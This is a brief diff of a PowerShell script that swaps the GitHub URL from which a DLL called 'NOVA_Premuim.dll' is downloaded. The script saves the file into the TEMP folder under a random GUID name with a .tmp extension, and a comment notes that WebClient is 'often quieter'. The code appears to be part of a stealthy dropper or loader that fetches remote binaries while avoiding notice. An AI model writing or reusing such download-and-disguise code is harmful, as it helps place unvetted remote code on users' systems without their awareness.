@@ -84,7 +84,7 @@ $dllFileName = "$randomGuid.tmp"
 
 # Force path to TEMP
 $dllPath = Join-Path $env:TEMP $dllFileName
-$dllUrl = "https://raw.githubusercontent.com/fourtikeeree-wq/silvex1/main/NOVA_Premuim.dll"
+$dllUrl = "https://raw.githubusercontent.com/novaxstorex/Premuim/main/NOVA_Premuim.dll"
 
 try {
     # Use WebClient or Invoke-WebRequest. WebClient is often quieter.
